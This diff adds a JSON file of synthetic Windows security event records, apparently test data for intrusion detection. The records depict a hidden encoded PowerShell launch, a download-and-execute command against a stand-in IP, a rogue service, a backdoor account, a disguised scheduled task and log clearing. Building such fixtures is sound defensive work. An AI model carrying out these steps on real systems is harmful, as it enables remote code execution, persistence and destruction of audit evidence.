@@ -1,0 +1,98 @@
+[
+  {
+    "ts": "2026-05-02T09:12:00Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "powershell.exe",
+    "parent_process": "",
+    "cmdline": "powershell -nop -w hidden -enc SQBFAFgA",
+    "dst_ip": "",
+    "detail": "encoded PowerShell"
+  },
+  {
+    "ts": "2026-05-02T09:12:05Z",
+    "event_id": 4104,
+    "channel": "Microsoft-Windows-PowerShell/Operational",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')"
+  },
+  {
+    "ts": "2026-05-02T09:13:00Z",
+    "event_id": 7045,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "A new service was installed: FakeSvc"
+  },
+  {
+    "ts": "2026-05-02T09:14:00Z",
+    "event_id": 4688,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "rundll32.exe",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "proxied execution"
+  },
+  {
+    "ts": "2026-05-02T09:16:00Z",
+    "event_id": 4720,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "A user account was created: supportadmin"
+  },
+  {
+    "ts": "2026-05-02T09:18:00Z",
+    "event_id": 4698,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"
+  },
+  {
+    "ts": "2026-05-02T09:25:00Z",
+    "event_id": 6416,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "external device recognized: USBSTOR"
+  },
+  {
+    "ts": "2026-05-02T09:40:00Z",
+    "event_id": 1102,
+    "channel": "Security",
+    "computer": "WEB-03",
+    "user": "",
+    "process": "",
+    "parent_process": "",
+    "cmdline": "",
+    "dst_ip": "",
+    "detail": "The audit log was cleared"
+  }
+]
